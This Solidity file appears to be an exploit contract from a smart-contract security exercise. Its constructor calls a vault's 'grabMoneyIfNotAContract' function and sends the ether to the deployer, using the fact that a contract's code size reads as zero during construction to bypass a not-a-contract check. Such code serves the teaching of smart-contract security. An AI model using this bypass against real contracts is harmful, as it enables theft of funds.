// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {IVaultForEOA} from "../interfaces/IVaultForEOA.sol";

contract EOAPretender {
    error EthTransferFailed();

    constructor(address _vault) {
        IVaultForEOA(_vault).grabMoneyIfNotAContract();

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) revert EthTransferFailed();
    }
}
